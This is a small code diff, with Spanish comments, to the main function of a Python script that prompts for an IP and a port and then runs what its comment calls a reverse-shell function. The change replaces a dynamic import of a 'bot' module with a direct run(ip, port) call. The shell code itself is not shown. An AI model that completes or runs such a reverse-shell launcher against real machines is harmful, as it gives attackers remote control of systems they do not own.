@@ -32,11 +32,8 @@ def main():
     ip = input("Introduzca la IP: ")
     port = int(input("Introduzca el puerto: "))  # Convertir a entero
 
-    # Importar el módulo bot
-    bot = __import__("bot")
-
     # Ejecutar la función de shell inverso
-    bot.run(ip, port)
+    run(ip, port)
 
 if __name__ == "__main__":
     main()
